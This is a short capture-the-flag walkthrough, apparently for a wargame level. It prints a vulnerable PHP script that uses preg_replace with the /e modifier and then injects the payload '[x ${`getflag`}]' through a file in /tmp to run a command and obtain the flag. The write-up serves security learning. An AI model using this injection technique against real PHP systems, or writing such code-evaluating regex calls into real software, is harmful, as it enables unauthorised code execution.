We start by listing the files in the home directory:

```bash
ls
```

Output:

```
level06  level06.php
```

The presence of `level06.php` suggests that the challenge might involve PHP execution. We inspect its contents:

```bash
cat level06.php
```

Output:

```php
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

The `x()` function reads the contents of a file and processes `[x some_command]`, replacing it with the result of `y()`. Since `preg_replace()` with the `/e` modifier allows executing code, we can inject our own command.

Since the script reads a file and processes `[x some_command]`, we create a file in `/tmp` with an injected command:

```bash
echo '[x ${`getflag`}]' > /tmp/injected
```

We execute `level06.php` with our malicious file:

```bash
./level06 /tmp/injected
```

And this way we get our next flag.
